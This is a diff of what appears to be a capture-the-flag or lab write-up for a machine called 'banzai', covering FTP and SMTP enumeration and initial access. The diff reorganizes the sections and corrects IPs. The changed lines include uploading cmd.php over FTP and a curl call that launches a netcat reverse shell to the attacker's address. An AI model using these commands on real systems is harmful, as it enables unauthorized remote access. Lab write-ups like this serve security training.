@@ -24,7 +24,7 @@ categories:
 
 ---
 
-## Recon
+## Enumeration
 
 ### Nmap
 
@@ -40,17 +40,13 @@ categories:
 ```
 {{< /collapse >}}
 
----
-
-## Enumeration
-
 ### Port 21 - FTP
 
 No anonymous access. No public exploits for vsftpd 3.0.3 (aside from DoS).
 
 ### Port 25 - SMTP
 
-User enumeration with Hydra and `smtp-user-enum` revealed standard system accounts plus `admin`, `ftp`, `mysql`, `postgres`.
+User enumeration with `smtp-user-enum` revealed standard system accounts plus `admin`, `ftp`, `mysql`, `postgres`.
 
 ### Port 8080 & 8295 - Web Apps
 
@@ -72,10 +68,10 @@ ftp 192.168.89.56
 > put cmd.php
 
 # Trigger reverse shell
-curl "http://192.168.206.56:8295/cmd.php?cmd=nc+-nv+192.168.49.206+8295+-e+/bin/bash"
+curl "http://192.168.89.56:8295/cmd.php?cmd=nc+-nv+192.168.49.89+8295+-e+/bin/bash"
 ```
 
-![MySQL credentials in config.php](/images/banzai/init-access.png)
+![Initial access via FTP upload](/images/banzai/init-access.png)
 
 ---
 
